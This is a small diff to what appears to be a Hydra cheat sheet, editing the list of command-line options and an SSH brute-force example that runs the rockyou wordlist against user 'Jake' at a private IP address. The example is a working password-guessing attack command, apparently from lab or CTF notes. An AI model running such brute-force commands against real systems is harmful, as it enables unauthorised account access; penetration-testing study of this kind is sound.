@@ -21,13 +21,12 @@ Common options:
 - `-I` → ignore restore file  
 - `-t N` → threads (4–16 for SSH, 32–64 for HTTP)  
 - `-w N` / `-W N` → wait N seconds between tries/after fail  
-- `-e nsr` → null, same-as-login, reversed  
-- `-u` → loop users first (faster)  
 - `-o found.txt` → save valid creds  
+- `-f` / `-F` → exit when a login/pass pair is found 
 
 ## 1. SSH Brute-Force Example
 ```bash
-	hydra -l Jake -P /usr/share/wordlists/rockyou.txt 10.113.181.5 ssh -t 4 -V -I
+hydra -l Jake -P /usr/share/wordlists/rockyou.txt 10.113.181.5 -s PORT ssh -t 4 -V -I -f
 ```
 
 **Flags explained**:
